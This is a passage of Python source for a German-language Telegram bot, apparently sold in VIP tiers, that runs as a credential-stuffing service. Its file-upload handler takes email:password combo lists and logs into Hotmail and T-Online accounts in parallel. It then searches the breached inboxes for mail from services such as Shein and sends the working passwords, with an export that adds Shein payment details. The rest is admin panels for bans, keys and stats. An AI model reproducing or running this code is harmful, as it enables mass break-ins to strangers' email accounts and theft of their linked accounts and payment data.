            vip_text = "📋 <b>VIP MEMBERS</b>\n\n"
            for i, vip in enumerate(vips, 1):
                vip_text += f"{i}. <code>{vip[0]}</code> @{vip[1] or 'N/A'}\n"
                vip_text += f"   Until: {vip[2]}\n\n"

        bot.edit_message_text(vip_text, 
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())

    elif call.data == "admin_ban_user":
        user_sessions[user_id] = {"mode": "admin_ban_user"}
        bot.edit_message_text(
            "🚫 <b>BAN USER</b>\n\n"
            "Sende die User ID:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "admin_unban_user":
        user_sessions[user_id] = {"mode": "admin_unban_user"}
        bot.edit_message_text(
            "✅ <b>UNBAN USER</b>\n\n"
            "Sende die User ID:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "admin_banned_list":
        banned = get_banned_users()

        if not banned:
            ban_text = "📋 <b>BANNED USERS</b>\n\n❌ No banned users"
        else:
            ban_text = "📋 <b>BANNED USERS</b>\n\n"
            for i, user in enumerate(banned, 1):
                ban_text += f"{i}. <code>{user[0]}</code> @{user[1] or 'N/A'}\n"
                ban_text += f"   Reason: {user[2] or 'N/A'}\n\n"

        bot.edit_message_text(ban_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())

    elif call.data == "admin_stats":
        conn = get_db()
        c = conn.cursor()

        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]

        c.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
        total_vips = c.fetchone()[0]

        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
        total_banned = c.fetchone()[0]

        c.execute("SELECT SUM(total_scans) FROM users")
        total_scans = c.fetchone()[0] or 0

        c.execute("SELECT SUM(total_hits) FROM users")
        total_hits = c.fetchone()[0] or 0

        conn.close()

        # Create buttons for viewing users
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("📋 View Free Users", callback_data="view_free_users")
        btn2 = types.InlineKeyboardButton("👑 View VIP Users", callback_data="view_vip_users")
        btn3 = types.InlineKeyboardButton("🚫 View Banned Users", callback_data="admin_banned_list")
        btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        markup.add(btn1, btn2, btn3, btn_back)

        stats_text = f"""
📊 <b>BOT STATISTICS</b>

👥 <b>Users:</b>
• Total: {total_users}
• Free: {total_users - total_vips - total_banned}
• VIP: {total_vips}
• Banned: {total_banned}

📈 <b>Activity:</b>
• Total Scans: {total_scans}
• Total Hits: {total_hits}

💎 <b>Created by {MY_SIGNATURE}</b>
"""

        bot.edit_message_text(stats_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=markup)

    elif call.data == "admin_broadcast":
        # Broadcast menu
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("📤 Send to All Users", callback_data="broadcast_all")
        btn2 = types.InlineKeyboardButton("👤 Send to One User", callback_data="broadcast_one")
        btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        markup.add(btn1, btn2, btn_back)

        bot.edit_message_text(
            "📢 <b>BROADCAST MESSAGE</b>\n\n"
            "Choose broadcast type:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )

    elif call.data == "broadcast_all":
        user_sessions[user_id] = {"mode": "admin_broadcast_all"}
        bot.edit_message_text(
            "📤 <b>BROADCAST AN ALLE</b>\n\n"
            "Sende die Nachricht:\n\n"
            "⚠️ Wird an ALLE User gesendet!",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "broadcast_one":
        user_sessions[user_id] = {"mode": "admin_broadcast_one", "step": "waiting_id"}
        bot.edit_message_text(
            "👤 <b>AN EINEN USER SENDEN</b>\n\n"
            "Sende die User ID:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "admin_user_stats":
        all_stats = get_all_stats()
        if not all_stats:
            bot.edit_message_text(
                t(user_id, "user_stats_empty"),
                call.message.chat.id, call.message.message_id, parse_mode='HTML',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")))
            return

        entries = []
        sorted_users = sorted(all_stats.items(), key=lambda x: x[1].get("total_scans", 0), reverse=True)
        for uid, data in sorted_users[:15]:
            uname = data.get("username", "N/A") or "N/A"
            scans = data.get("total_scans", 0)
            hits = data.get("total_hits", 0)
            inbox = data.get("inbox_checks", 0)
            last = data.get("last_active", "N/A") or "N/A"
            entries.append(t(user_id, "user_stats_entry",
                           uid=uid, username=uname, scans=scans, hits=hits, inbox=inbox, last_active=last))

        stats_text = t(user_id, "user_stats_title") + "\n\n" + "\n\n".join(entries)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))
        bot.edit_message_text(stats_text, call.message.chat.id, call.message.message_id,
                             parse_mode='HTML', reply_markup=markup)

    elif call.data == "admin_top_users":
        top = get_top_users(10, "total_scans")
        if not top:
            bot.edit_message_text(
                t(user_id, "user_stats_empty"),
                call.message.chat.id, call.message.message_id, parse_mode='HTML',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")))
            return

        entries = []
        for i, (uid, data) in enumerate(top, 1):
            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
            uname = data.get("username", "N/A") or "N/A"
            scans = data.get("total_scans", 0)
            hits = data.get("total_hits", 0)
            combos = data.get("total_combos_checked", 0)
            inbox_hits = data.get("inbox_hits", 0)
            entries.append(f"{medal} <code>{uid}</code> (@{uname})\n"
                          f"   📊 Scans: {scans} | ✅ Hits: {hits} | 📬 Inbox Hits: {inbox_hits}\n"
                          f"   📦 Combos: {combos}")

        global_s = get_global_stats()
        header = (f"🏆 <b>TOP USERS</b>\n\n"
                 f"📊 <b>Global:</b> {global_s['total_scans']} Scans | {global_s['total_hits']} Hits | "
                 f"{global_s['total_combos']} Combos\n"
                 f"👥 <b>Active Users:</b> {global_s['total_users']}\n\n")

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))
        bot.edit_message_text(header + "\n\n".join(entries) + f"\n\n💎 {MY_SIGNATURE}",
                             call.message.chat.id, call.message.message_id,
                             parse_mode='HTML', reply_markup=markup)

    elif call.data.startswith("sorted_export_"):
        target_user_id = int(call.data.replace("sorted_export_", ""))
        if call.from_user.id != target_user_id and call.from_user.id != ADMIN_ID:
            bot.answer_callback_query(call.id, "❌ Access denied!", show_alert=True)
            return
        session = user_sessions.get(target_user_id, {})
        last_hits = session.get("last_hits_data", [])

        if not last_hits:
            bot.answer_callback_query(call.id, "❌ No hits data available!", show_alert=True)
        else:
            from collections import defaultdict
            service_groups = defaultdict(list)
            for hit in last_hits:
                for svc in hit.get('services', []):
                    service_groups[svc].append(hit)
                if not hit.get('services'):
                    service_groups['No Service'].append(hit)

            sorted_services = sorted(service_groups.keys())

            sorted_file_path = f"sorted_export_{target_user_id}.txt"
            with open(sorted_file_path, 'w', encoding='utf-8') as f:
                f.write(f"# Sorted Export by Service — {MY_SIGNATURE}\n")
                f.write(f"# Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total Services Found: {len(sorted_services)}\n\n")

                for svc in sorted_services:
                    svc_hits = service_groups[svc]
                    f.write(f"{'='*40}\n")
                    f.write(f"📌 {svc} — {len(svc_hits)} hits\n")
                    f.write(f"{'='*40}\n")
                    for idx, h in enumerate(svc_hits, 1):
                        line_text = f"  #{idx} {h['email']}:{h['password']}"
                        if svc == "Shein" and h.get('shein_payment'):
                            clean_pay = h['shein_payment'].replace('<b>', '').replace('</b>', '').strip()
                            line_text += f"  | {clean_pay}"
                        f.write(line_text + "\n")
                    f.write("\n")

            try:
                with open(sorted_file_path, 'rb') as f:
                    bot.send_document(call.message.chat.id, f,
                        caption=f"📂 <b>Sorted Export</b>\n\n"
                                f"Services: {len(sorted_services)}\n"
                                f"Total Hits: {len(last_hits)}\n\n"
                                f"💎 {MY_SIGNATURE}",
                        parse_mode='HTML')
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Export failed: {str(e)}", show_alert=True)

            if os.path.exists(sorted_file_path):
                os.remove(sorted_file_path)

            if "last_hits_data" in session:
                del session["last_hits_data"]

    elif call.data == "admin_maintenance":
        global maintenance_mode
        maintenance_mode = not maintenance_mode
        status = "🟢 ON" if maintenance_mode else "🔴 OFF"
        bot.edit_message_text(
            f"🔧 <b>MAINTENANCE MODE</b>\n\n"
            f"Status: <b>{status}</b>\n\n"
            f"{'⚠️ All scan features are now DISABLED for non-admin users.' if maintenance_mode else '✅ All features are now available to all users.'}",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
            )
        )

    elif call.data == "admin_active_scans":
        if not active_scans:
            bot.edit_message_text(
                "🔍 <b>AKTIVE SCANS</b>\n\n"
                "❌ Keine aktiven Scans im Moment.\n\n"
                f"💎 {MY_SIGNATURE}",
                call.message.chat.id, call.message.message_id,
                parse_mode='HTML',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")))
        else:
            with _scan_lock:
                running = {uid: val for uid, val in active_scans.items() if val}
            if not running:
                bot.edit_message_text(
                    "🔍 <b>AKTIVE SCANS</b>\n\n"
                    "❌ Keine aktiven Scans im Moment.\n\n"
                    f"💎 {MY_SIGNATURE}",
                    call.message.chat.id, call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=types.InlineKeyboardMarkup().add(
                        types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")))
            else:
                lines = []
                markup = types.InlineKeyboardMarkup(row_width=1)
                for uid in running:
                    u = get_json_user(uid)
                    uname = u.get("username", "N/A") if u else "N/A"
                    lines.append(f"👤 <code>{uid}</code> (@{uname})")
                    markup.add(types.InlineKeyboardButton(
                        f"⏹ Stop {uid} (@{uname})", callback_data=f"admin_stop_{uid}"))
                markup.add(
                    types.InlineKeyboardButton("⏹ ALLE STOPPEN", callback_data="admin_stop_all"),
                    types.InlineKeyboardButton("🔄 Aktualisieren", callback_data="admin_active_scans"),
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))
                bot.edit_message_text(
                    f"🔍 <b>AKTIVE SCANS ({len(running)})</b>\n\n" +
                    "\n".join(lines) +
                    f"\n\n💎 {MY_SIGNATURE}",
                    call.message.chat.id, call.message.message_id,
                    parse_mode='HTML', reply_markup=markup)

    elif call.data.startswith("admin_stop_"):
        if call.data == "admin_stop_all":
            stopped_count = 0
            for uid in list(active_scans.keys()):
                if active_scans.get(uid):
                    active_scans[uid] = False
                    stopped_count += 1
            bot.answer_callback_query(call.id, f"⏹ {stopped_count} Scans gestoppt!", show_alert=True)
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("🔄 Aktualisieren", callback_data="admin_active_scans"),
                types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))
            bot.edit_message_text(
                f"⏹ <b>ALLE SCANS GESTOPPT</b>\n\n"
                f"✅ {stopped_count} Scans wurden beendet.\n\n"
                f"💎 {MY_SIGNATURE}",
                call.message.chat.id, call.message.message_id,
                parse_mode='HTML', reply_markup=markup)
        else:
            target_uid = int(call.data.replace("admin_stop_", ""))
            if active_scans.get(target_uid):
                active_scans[target_uid] = False
                u = get_json_user(target_uid)
                uname = u.get("username", "N/A") if u else "N/A"
                bot.answer_callback_query(call.id, f"⏹ Scan von @{uname} gestoppt!", show_alert=True)
                try:
                    bot.send_message(target_uid,
                        f"⏹ <b>Dein Scan wurde vom Admin gestoppt.</b>\n\n💎 {MY_SIGNATURE}",
                        parse_mode='HTML')
                except:
                    pass
            else:
                bot.answer_callback_query(call.id, "❌ Kein aktiver Scan gefunden.", show_alert=True)
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("🔄 Aktualisieren", callback_data="admin_active_scans"),
                types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))
            bot.edit_message_text(
                f"⏹ <b>Scan gestoppt</b>\n\n"
                f"User: <code>{target_uid}</code>\n\n"
                f"💎 {MY_SIGNATURE}",
                call.message.chat.id, call.message.message_id,
                parse_mode='HTML', reply_markup=markup)

    elif call.data == "admin_groups":
        groups = load_allowed_groups()
        if groups:
            group_list = "\n".join([f"• <code>{g}</code>" for g in groups])
        else:
            group_list = "Keine Gruppen aktiviert"
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("➕ Gruppe hinzufügen", callback_data="group_add"),
            types.InlineKeyboardButton("➖ Gruppe entfernen", callback_data="group_remove"),
            types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        )
        bot.edit_message_text(
            f"👥 <b>GRUPPEN-VERWALTUNG</b>\n\n"
            f"🆓 In Gruppen sind alle Features kostenlos!\n"
            f"Füge den Bot in eine Gruppe ein und sende /start als Admin.\n\n"
            f"📋 <b>Aktive Gruppen ({len(groups)}):</b>\n{group_list}\n\n"
            f"💎 {MY_SIGNATURE}",
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML', reply_markup=markup
        )

    elif call.data == "group_add":
        user_sessions[user_id] = {"mode": "admin_group_add"}
        bot.edit_message_text(
            "➕ <b>GRUPPE HINZUFÜGEN</b>\n\n"
            "Sende die Gruppen-Chat-ID (negative Zahl).\n\n"
            "💡 <b>Tipp:</b> Füge den Bot einfach in die Gruppe ein und sende dort /start!\n"
            "Die Gruppe wird automatisch aktiviert.",
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "group_remove":
        groups = load_allowed_groups()
        if not groups:
            bot.edit_message_text("❌ Keine Gruppen zum Entfernen.",
                call.message.chat.id, call.message.message_id,
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_groups")))
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for g in groups:
            markup.add(types.InlineKeyboardButton(f"❌ {g}", callback_data=f"group_del_{g}"))
        markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_groups"))
        bot.edit_message_text("➖ <b>Welche Gruppe entfernen?</b>",
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML', reply_markup=markup)

    elif call.data.startswith("group_del_"):
        gid = int(call.data.replace("group_del_", ""))
        remove_allowed_group(gid)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_groups"))
        bot.edit_message_text(
            f"✅ Gruppe <code>{gid}</code> wurde entfernt!",
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML', reply_markup=markup)

    elif call.data == "admin_user_logs":
        all_logs = get_all_user_logs()
        if not all_logs:
            bot.edit_message_text("📋 Noch keine User-Logs vorhanden.",
                call.message.chat.id, call.message.message_id,
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")))
            return
        entries = []
        sorted_logs = sorted(all_logs.items(),
            key=lambda x: x[1]["actions"][-1]["time"] if x[1]["actions"] else "", reverse=True)
        for uid, data in sorted_logs[:15]:
            uname = data.get("username", "N/A")
            devices = ", ".join(data.get("devices", [])[:3]) or "N/A"
            last_action = data["actions"][-1] if data["actions"] else {}
            last_time = last_action.get("time", "N/A")
            last_act = last_action.get("action", "N/A")[:30]
            action_count = len(data.get("actions", []))
            entries.append(
                f"👤 <code>{uid}</code> (@{uname})\n"
                f"   📱 {devices}\n"
                f"   🕐 Letzte: {last_time}\n"
                f"   📊 {action_count} Aktionen | Letzte: {last_act}")
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🔍 User-Log suchen", callback_data="search_user_log"),
            types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        )
        text_out = "📋 <b>USER ACTIVITY LOGS</b>\n\n" + "\n\n".join(entries) + f"\n\n💎 {MY_SIGNATURE}"
        if len(text_out) > 4000:
            text_out = text_out[:3950] + "\n\n... (gekürzt)"
        bot.edit_message_text(text_out,
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML', reply_markup=markup)

    elif call.data == "search_user_log":
        user_sessions[user_id] = {"mode": "admin_search_log"}
        bot.edit_message_text(
            "🔍 <b>USER-LOG SUCHEN</b>\n\n"
            "Sende die User-ID um deren Log zu sehen:",
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML')

    elif call.data == "admin_generate_key":
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("⏱ 1 Stunde", callback_data="keygen_1h")
        btn2 = types.InlineKeyboardButton("📅 1 Tag", callback_data="keygen_1d")
        btn3 = types.InlineKeyboardButton("📆 1 Woche", callback_data="keygen_1w")
        btn4 = types.InlineKeyboardButton("🗓 1 Monat", callback_data="keygen_1m")
        btn5 = types.InlineKeyboardButton("♾️ Forever", callback_data="keygen_forever")
        btn_back = types.InlineKeyboardButton("◀️ Zurück", callback_data="admin_panel")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn_back)
        bot.edit_message_text(
            "🔑 <b>KEY GENERIEREN</b>\n\n"
            "Wie lange soll der Key gültig sein?",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )

    elif call.data.startswith("keygen_"):
        duration = call.data.replace("keygen_", "")
        duration_labels = {
            "1h": "1 Stunde",
            "1d": "1 Tag",
            "1w": "1 Woche",
            "1m": "1 Monat",
            "forever": "Forever"
        }
        generated_key = generate_redeem_code(vip_duration=duration)
        label = duration_labels.get(duration, duration)
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn_back = types.InlineKeyboardButton("◀️ Zurück", callback_data="admin_generate_key")
        btn_panel = types.InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")
        markup.add(btn_back, btn_panel)
        bot.edit_message_text(
            f"✅ <b>KEY GENERIERT!</b>\n\n"
            f"🔑 Key: <code>{generated_key}</code>\n"
            f"⏱ Gültig: <b>{label}</b>\n\n"
            f"Schick diesen Key an den Nutzer.\n"
            f"Er kann ihn mit /redeem einlösen.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )

    elif call.data == "view_free_users":
        free_users = get_free_users()

        if not free_users:
            user_text = "📋 <b>FREE USERS</b>\n\n❌ No free users"
        else:
            user_text = f"📋 <b>FREE USERS</b> ({len(free_users)} total)\n\n"
            for i, user in enumerate(free_users[:20], 1):  # Show first 20
                user_text += f"{i}. <code>{user[0]}</code> @{user[1] or 'N/A'}\n"

            if len(free_users) > 20:
                user_text += f"\n... and {len(free_users) - 20} more"

        bot.edit_message_text(user_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())

    elif call.data == "view_vip_users":
        vips = get_all_vips()

        if not vips:
            vip_text = "📋 <b>VIP USERS</b>\n\n❌ No VIP users"
        else:
            vip_text = f"📋 <b>VIP USERS</b> ({len(vips)} total)\n\n"
            for i, vip in enumerate(vips, 1):
                vip_text += f"{i}. <code>{vip[0]}</code> @{vip[1] or 'N/A'}\n"
                vip_text += f"   Until: {vip[2]}\n\n"

        bot.edit_message_text(vip_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())

    elif call.data == "back_main":
        bot.delete_message(call.message.chat.id, call.message.message_id)

    # VIP Duration
    elif call.data.startswith("vip_duration_"):
        duration = call.data.replace("vip_duration_", "")
        session = user_sessions.get(user_id, {})
        target_user_id = session.get("vip_target_id")

        if target_user_id:
            target_username = session.get("vip_target_username", "Unknown")
            add_vip(target_user_id, target_username, duration)

            duration_text = {
                "1h": "1 Stunde",
                "1d": "1 Tag",
                "1w": "1 Woche",
                "1m": "1 Monat",
                "forever": "Forever"
            }

            bot.edit_message_text(
                f"✅ <b>VIP hinzugefügt!</b>\n\n"
                f"👤 User: <code>{target_user_id}</code> (@{target_username})\n"
                f"⏱ Dauer: {duration_text.get(duration, 'Unknown')}",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML',
                reply_markup=admin_panel_keyboard()
            )

            try:
                bot.send_message(target_user_id,
                               f"🎉 <b>Glückwunsch!</b>\n\n"
                               f"Du bist jetzt VIP!\n"
                               f"⏱ Dauer: {duration_text.get(duration, 'Unknown')}\n\n"
                               f"💎 {MY_SIGNATURE}",
                               parse_mode='HTML')
            except:
                pass

            user_sessions.pop(user_id, None)



# Handle File Uploads
@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id

    if is_group_chat(message) and not is_allowed_group(message.chat.id):
        return

    username = message.from_user.username or "unknown"
    log_user_activity(user_id, username, "document_upload", message)

    if is_banned(user_id):
        bot.send_message(message.chat.id,
                        f"❌ You are banned!",
                        parse_mode='HTML')
        return

    if maintenance_mode and user_id != ADMIN_ID:
        bot.send_message(message.chat.id,
            "🔧 <b>MAINTENANCE MODE</b>\n\n"
            "The bot is currently under maintenance.\n"
            "Please try again later!\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML')
        return

    # ── INBOX CHECKER MODE ──────────────────────────────────────
    doc_session = user_sessions.get(user_id, {})

    if doc_session.get("mode") in ("inbox_single", "inbox_multi") and doc_session.get("step") == "waiting_combo":
        services = doc_session.get("services", [])
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

            combos = []
            for line in raw_lines:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
                email_addr, password = parts[0].strip(), parts[1].strip()
                if password and '@' in email_addr and '.' in email_addr.split('@')[-1]:
                    combos.append((email_addr, password))

            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ Keine gültigen Zeilen gefunden.")
                user_sessions.pop(user_id, None)
                return

            services_display = ", ".join(services)
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ Du hast bereits einen aktiven Scan! Bitte warte bis er fertig ist.", parse_mode='HTML')
                return

            progress_msg = bot.send_message(
                message.chat.id,
                f"🔍 <b>Inbox Check gestartet!</b>\n\n"
                f"📬 Services: <b>{services_display}</b>\n"
                f"📥 Accounts: <b>{total}</b>\n\n"
                f"⏳ Bitte warten...",
                parse_mode='HTML',
                reply_markup=stop_scan_keyboard(user_id)
            )

            hits = []
            bads = []
            no_inbox = []
            errors_list = []
            checked = [0]
            lock = threading.Lock()

            def inbox_check_one(combo):
                email_addr, password = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(email_addr, password)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(email_addr, password)

                    status = result.get("status", "RETRY")

                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{email_addr}:{password}")
                        return

                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{email_addr}:{password} | {status}")
                        return

                    found_services = []
                    for svc in services:
                        svc_lower = svc.lower().strip()
                        found = False
                        known = KNOWN_SERVICE_SENDERS.get(svc_lower, [])
                        if provider == "tonline":
                            if known:
                                for sender in known:
                                    imap_results = TOnlineChecker.search_inbox(email_addr, password, sender)
                                    if imap_results:
                                        found = True
                                        break
                            else:
                                imap_results = TOnlineChecker.search_inbox(email_addr, password, svc_lower)
                                if imap_results:
                                    found = True
                                if not found:
                                    imap_results2 = TOnlineChecker.search_inbox(email_addr, password, svc_lower + ".de")
                                    if imap_results2:
                                        found = True
                        else:
                            token = result.get("token", "")
                            cid = result.get("cid", "")
                            if known:
                                for sender in known:
                                    if _inbox_search_hotmail(token, cid, f'from:"{sender}"'):
                                        found = True
                                        break
                            else:
                                for query in [f'from:"{svc_lower}.com"', f'from:"{svc_lower}.de"']:
                                    if _inbox_search_hotmail(token, cid, query):
                                        found = True
                                        break
                        if found:
                            found_services.append(svc)

                    with lock:
                        checked[0] += 1
                        if found_services:
                            hits.append(f"{email_addr}:{password} | {', '.join(found_services)}")
                            hit_num = len(hits)
                        else:
                            no_inbox.append(f"{email_addr}:{password}")

                    if found_services:
                        try:
                            svc_text = "\n".join([f"✅ {s}" for s in found_services])
                            hit_msg = (
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"📬 <b>INBOX HIT #{hit_num}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"📧 Email: <code>{email_addr}</code>\n"
                                f"🔑 Password: <code>{password}</code>\n\n"
                                f"🔗 <b>Gefundene Services:</b>\n"
                                f"{svc_text}\n\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"💎 {MY_SIGNATURE}"
                            )
                            inbox_is_group = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            send_target = user_id if inbox_is_group else message.chat.id
                            bot.send_message(send_target, hit_msg, parse_mode='HTML')
                        except Exception:
                            pass
                except Exception as e:
                    print(f"[InboxWorker] Error checking {email_addr}: {e}")
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{email_addr}:{password} | ERROR")

            def inbox_progress_updater():
                last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != last:
                        last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🔍 <b>Inbox Check läuft...</b>\n\n"
                                f"📬 Services: <b>{services_display}</b>\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 Kein Match: <b>{len(no_inbox)}</b>",
                                message.chat.id,
                                progress_msg.message_id,
                                parse_mode='HTML',
                                reply_markup=stop_scan_keyboard(user_id)
                            )
                        except:
                            pass
                    time.sleep(3)

            _chat_id = message.chat.id
            _pm_id = progress_msg.message_id
            _username = message.from_user.username or ""

            def _inbox_scan_thread():
              try:
                threading.Thread(target=inbox_progress_updater, daemon=True).start()

                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                    executor.map(inbox_check_one, combos)

                end_scan(user_id)

                try:
                    bot.delete_message(_chat_id, _pm_id)
                except:
                    pass

                checked_count = checked[0]

                record_inbox(user_id, username=_username,
                            service_name=services_display, combos_count=checked_count,
                            hits=len(hits), bads=len(bads))

                inbox_is_group = is_allowed_group(_chat_id) and _chat_id != user_id

                summary = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📬 <b>INBOX SCAN {'⏹ GESTOPPT' if checked_count < total else 'ABGESCHLOSSEN'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🔎 <b>Services:</b> {services_display}\n"
                    f"📊 <b>Gecheckt:</b> {checked_count}/{total}\n"
                    f"✅ <b>Linked (Hit):</b> {len(hits)}\n"
                    f"📭 <b>Login OK, kein Match:</b> {len(no_inbox)}\n"
                    f"❌ <b>Bad (Login fehlgeschlagen):</b> {len(bads)}\n"
                    f"🔄 <b>Errors/Retry:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits wurden dir privat gesendet!</i>' + chr(10) + chr(10) if inbox_is_group and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"💎 {MY_SIGNATURE}"
                )
                bot.send_message(_chat_id, summary, parse_mode='HTML')

                all_lines = []
                if hits:
                    all_lines.append("═══ HITS (LINKED) ═══")
                    all_lines.extend(hits)
                if no_inbox:
                    all_lines.append("\n═══ LOGIN OK / KEIN MATCH ═══")
                    all_lines.extend(no_inbox)
                if bads:
                    all_lines.append("\n═══ BAD (LOGIN FAILED) ═══")
                    all_lines.extend(bads)
                if errors_list:
                    all_lines.append("\n═══ ERRORS / RETRY ═══")
                    all_lines.extend(errors_list)

                if all_lines:
                    file_obj = BytesIO("\n".join(all_lines).encode('utf-8'))
                    file_obj.name = f"INBOX_FULL_{len(hits)}hits_{len(bads)}bad_{total}total.txt"
                    send_target = user_id if inbox_is_group else _chat_id
                    bot.send_document(
                        send_target,
                        file_obj,
                        caption=(
                            f"📬 <b>Inbox Ergebnis — {services_display}</b>\n"
                            f"✅ {len(hits)} Hits | ❌ {len(bads)} Bad | 📭 {len(no_inbox)} Kein Match | 🔄 {len(errors_list)} Errors\n\n"
                            f"💎 {MY_SIGNATURE}"
                        ),
                        parse_mode='HTML'
                    )
              except Exception as e:
                try:
                    bot.send_message(_chat_id, f"❌ Fehler: {str(e)}")
                except:
                    pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_inbox_scan_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Fehler: {str(e)}")
        return

    generic_service_modes = {svc["mode"]: key for key, svc in INBOX_SERVICES.items()}
    if doc_session.get("mode") in generic_service_modes and doc_session.get("step") == "waiting_combo":
        service_key = generic_service_modes[doc_session["mode"]]
        run_generic_inbox_check(message, user_id, service_key)
        return

    # ── RYD INBOXEN MODE ────────────────────────────────────────
    if doc_session.get("mode") == "inbox_ryd" and doc_session.get("step") == "waiting_combo":
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

            combos = []
            for line in raw_lines:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
